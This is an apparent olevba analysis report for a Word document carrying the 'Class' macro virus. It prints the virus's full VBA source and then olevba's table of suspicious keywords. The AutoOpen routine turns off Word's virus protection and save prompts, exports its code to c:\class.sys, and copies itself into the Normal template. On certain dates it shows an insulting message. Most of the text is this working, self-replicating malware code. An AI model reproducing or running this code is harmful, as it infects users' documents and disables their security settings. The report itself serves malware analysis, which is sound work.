olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-ec59e92d321e0b5bea49276bb697325bcb6ae507
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-ec59e92d321e0b5bea49276bb697325bcb6ae507 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
On Error GoTo out
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
Options.VirusProtection = False
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
Options.SaveNormalPrompt = False
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
Options.ConfirmConversions = False
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If nt > 70 And ad > 0 Then GoTo out
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If nt < 70 Then
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End If
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
host.codemodule.AddFromFile ("c:\class.sys")
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
With host.codemodule
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    For x = 1 To 4
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    .deletelines 1
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    Next x
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End With
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If nt < 70 Then
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    With host.codemodule
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    .replaceline 1, "Sub AutoClose()"
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    .replaceline 71, "Sub ToolsMacro()"
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    End With
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End If
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
With host.codemodule
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    For x = 2 To 72 Step 2
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
    Next x
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End With
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
out:
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End Sub
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
Sub ViewVBCode()
'IFC1/26/99 4:41:14 PMHP LaserJet 5 on COM1:FACT-Sheet-English-Germany99.docThe Dot
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
